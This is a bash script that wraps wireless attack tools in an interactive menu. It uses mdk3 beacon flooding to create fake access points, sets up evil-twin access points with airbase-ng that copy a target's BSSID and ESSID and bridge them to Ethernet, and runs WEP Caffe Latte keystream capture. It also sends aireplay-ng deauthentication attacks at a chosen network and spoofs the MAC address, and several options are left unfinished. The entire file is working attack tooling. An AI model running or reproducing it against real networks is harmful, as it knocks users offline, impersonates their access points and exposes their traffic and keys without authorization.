#!/bin/bash

Pname="python" #use python3

function setcard() {

	#mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	mon=$(sudo airmon-ng start ${interface} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
	
	echo -e "\n[*] You can use 'sudo airmon-ng stop ${mon}' to exit monitor mode."
	echo -e "[*] You can use (Need exit monitor mode.)\n'sudo ifconfig ${interface} down && sudo macchanger -p \
${interface} && sudo ifconfig ${interface} up'\n[*] to correct mac address.(Need exit monitor mode.)"
	#Use mon
	if [ $option == newsAP -o $option == newsap ]; then
        	echo "[+] Running now(Ctrl+C to stop)..."
        	sudo mdk3 ${mon} b -a -f code/news.txt -s 200
    	elif [ $option == diyAP -o $option == diyap ]; then
        	echo "Not FINISH!"
		read -p "[&] Enter the diy file path: "  filename
        	echo "[+] Running now(Ctrl+C to stop)..."
        	sudo mdk3 ${mon} b -a -f $filename -s 200
        elif [ $option == random ]; then
            	 echo "[+] Running now(Ctrl+C to stop)..."
        	 sudo mdk3 ${mon} b -a -s 200
        elif [ $option == evil-twin ]; then
	         YBridgeSet
		 sudo airbase-ng -a $tb --essid "$ts" -c $tc $mon&
	 	 netbridge
	elif [ $option == Caffe_Latte -o $option == caffe_latte ]; then
		 YBridgeSet
		 sudo airbase-ng -a $tb --essid "$ts" -L -W 1 -c $tc $mon&
		 netbridge
		 echo -e "[#] Use(other shell) 'sudo airodump-ng $mon -c $tc --essid "$ts" -w keystream'"
	elif [ $option == MITM -o $option == mitm ]; then
		 echo ""
	fi
}

function netbridge() {

	sudo brctl addbr Wifi-Bridge
	sudo brctl addif Wifi-Bridge $ethName
	sudo brctl addif Wifi-Bridge at0
	sudo ifconfig $ethName 0.0.0.0 up
	sudo ifconfig at0 0.0.0.0 up
	sudo echo 1 > /proc/sys/net/ipv4/ip_forward
	sudo ifconfig Wifi-Bridge up
	echo "[!] Please chaeck if there is any error message(Existing information can be ignored)."
	echo "[+] Running now...(Use 'Ctrl+C' to stop the airbase-ng.)"
	
}

function ethset() {
	read -p "[!] Select the Ethernet interface(default: $eth0) to use?[Y/N]" ethChange
	if [ $ethChange == "Y" -o $ethChange == "y"  ]; then
		sudo ifconfig
		read -p "[!] Select the Ethernet interface: " ethUse
		ethCheck=$(sudo ifconfig $ethUse|grep "$ethUse"|cut -d ':' -f1)
		
		# Need check exist
		if [ "$ethCheck" == "$ethUse" ]; then
			ethName="$ethUse"
			echo "[+] Use interface: $ethUse"
		else
			exit 1
		fi
	fi
}

function bridgeQA() {
	echo "[!] Need to know the target MAC Address,SSID and Channel."
	read -p '[&] Enter the target BSSID: ' tb
	read -p '[&] Enter the target ESSID: ' ts
	read -p '[&] Enter the target Channel: ' tc
}

function NBridgeSet() {
	 # interface
	 bridgeQA
	 ethName="eth0"
	 ethset
	 sudo iwconfig $interface channel $tc
	 read -p '[!] Start deauthentication attack? [Y/N] ' qsend
	 if [ $qsend == "Y" -o $qsend == "y"  ]; then
		  sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface
	 else
		  echo "[+] Don't send."
	 fi
}

function YBridgeSet() {
	 # mon
	 bridgeQA
     	 ethName="eth0"
	 ethset
	 sudo iwconfig $mon channel $tc
	 read -p '[!] Start deauthentication attack? [Y/N] ' qsend
	 if [ $qsend == "Y" -o $qsend == "y"  ]; then
	     sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $mon
	 else
	     echo "[+] Don't send."
         fi
}

function usetools() {
	 if [ "${mcheck}" == "Monitor" ]; then
		 read -p "[&] Skip set interface? [Y/N]" skipset
                 if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	 if [ $option == wash ]; then
			 	 sudo $option -i $interface
			 elif [ $option == airodump-ng ]; then
			     sudo $option $interface
			 fi
		 else
		         sudo airmon-ng stop ${interface}
		 	 mon=$(sudo airmon-ng start ${interface} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
	     	         echo -e "\n[*] Use 'sudo airmon-ng stop ${mon}' exit monitor mode."
			 if [ $option == wash ]; then
			 	 sudo $option -i $mon
			 elif [ $option == airodump-ng ]; then
			     sudo $option $mon
			 fi
		 fi
	 else 
	 	 mon=$(sudo airmon-ng start ${interface} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
	         echo -e "\n[*] Use 'sudo airmon-ng stop ${mon}' to exit monitor mode."
		 if [ $option == wash ]; then
			 sudo $option -i $mon
		 elif [ $option == airodump-ng ]; then
			 sudo $option $mon
		 fi
	 fi	 
}

function option_tree() {
	read -p '[&] Function: [ fakeAP,Protocol,Attack,scanAP ]: ' o1
	if [ $o1 == fakeAP -o $o1 == fakeap ]; then
		 #FakeAP
		 read -p '[&] Options: [ random,newsAP,diyAP ]: ' option
	elif [ $o1 == Protocol -o $o1 == protocol ]; then
		 #Wifi
		 read -p '[&] WiFi protocol: [ WEP,WPS,WPA,WPA2 ]: ' o2
		 if [ $o2 == WEP -o $o2 == wep ]; then
		 		 echo "-------------------------------------------\
----------------------------------"
				 echo "Options::"
			         read -p '[&] Options: [ Caffe_Latte ]: ' option
		 elif [ $o2 == WPS -o $o2 == wps ]; then
				 echo "-------------------------------------------\
----------------------------------"
				 echo "Options:"
				 echo "[+] getPIN: brute force attack."
				 read -p '[&] Options [ getPIN ]: ' option
		 elif [ $o2 == WPA -o $o2 == wpa ]; then
				 #read -p '[&] Options [  ]: ' option
				 echo "Not finish"
		 elif [ $o2 == WPA2 -o $o2 == wpa2 ]; then
				 #read -p '[&] Options [  ]: ' option
				 echo "Not finish"
		 else
			  echo " [-] Unknown option: $o2"
			  exit 1
		 fi
	elif [ $o1 == Attack -o $o1 == attack ]; then
		 read -p '[&] Options: [ evil-twin,MITM ]: ' option
	elif [ $o1 == scanAP -o $o1 == scanap ]; then
		 #airodump: airodump-ng(Aircrack-ng)
		 #wash: wash(reaver)
		 read -p '[&] Choose tool to scan [ airodump,wash ]: ' option
	else
		  echo " [-] Unknown option: $o1"
		  exit 1	 	  
	fi
}


echo "[+] List:"
sudo iwconfig
read -p "[&] Please select interface : " interface
check=$(sudo iwconfig $interface)
#echo $check
if [ ! -n "$check" ]; then

	echo "[-] This interface no wireless extensions."

else
    mcheck=$(sudo iwconfig $interface|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
    
	skipset="n"

    option_tree
    if [ $option == newsAP -o $option == newsap ]; then
		
	echo "[=] Option: newsAP"
	echo "[+] Get news..."
	IP="news.sina.com.cn"
	testNet=`ping -c 2 $IP | grep "100% packet loss" | wc -l`
	if [ "${testNet}" != 0 ];then
		echo -e "[!] Unable to connect to ${IP}'."
	        exit 1
	else
		#check python path or name
		sudo $Pname code/getnews.py
	fi
    elif [ $option == diyAP -o $option == diyap ]; then
	 echo "Not Finish!"
	 #diy file.
    elif [ $option == random ]; then
	 echo "[=] Option: random"
    elif [ $option == evil-twin ]; then
	 echo "[=] Option: evil-twin"
    elif [ $option == Caffe_Latte -o $option == caffe_latte ]; then
	 echo "[=] Option: Caffe_Latte"getPIN
    elif [ $option == getPIN -o $option == getpin ]; then
	 echo "[=] Option: getPIN"
    elif [ $option == wash ]; then
	 usetools
	 exit 1
    elif [ $option == airodump ]; then
	 usetools
	 exit 1
    else
	 echo " [-] Unknown option: $option"
	 exit 1
    fi

    read -p '[!] Change the mac address? [Y/N] ' key
    if [ $key == "Y" -o $key == "y"  ]; then
            sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        
    else
        echo -e "\n[-] Don't Change the mac address."
    fi
		
	if [ "${mcheck}" == "Monitor" ]; then
		read -p "[&] Skip settings ?[Y/N]" skipset
                if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	if [ $option == newsAP -o $option == newsap ]; then
		 	 	  echo "[+] Running now(Ctrl+C to stop)..."
                  		  sudo mdk3 $interface b -a -f code/news.txt -s 200
			elif [ $option == diyAP -o $option == diyap ]; then
		 	 	  echo "Not FINISH!"
		 	 	  echo "[+] Running now(Ctrl+C to stop)..."
				  read -p "[&] Enter the diy file path: "  filename
                  		  sudo mdk3 $interface b -a -f $filename -s 200
			elif [ $option == random ]; then
		 	 	  echo "[+] Running now(Ctrl+C to stop)..."
                		  sudo mdk3 $interface b -a -s 200
			elif [ $option == evil-twin ]; then
			 	  NBridgeSet
				  sudo airbase-ng -a $tb --essid "$ts" -c $tc $interface&
				  netbridge
			elif [ $option == Caffe_Latte -o $option == caffe_latte ]; then
				  NBridgeSet
				  sudo airbase-ng -a $tb --essid "$ts" -L -W 1 -c $tc $interface&
	 			  netbridge
				  echo -e "[#] Use(other shell) 'sudo airodump-ng $interface -c $tc --essid "$ts" -w keystream'"
           		elif [ $option == MITM -o $option == mitm ]; then
			 	  echo ""
			fi
        	else
			 echo -e "\n[-] Change interface to Monitor mode."
			 sudo airmon-ng stop ${interface}
			 setcard
		fi
    	else 
		 setcard
    	fi
    
fi
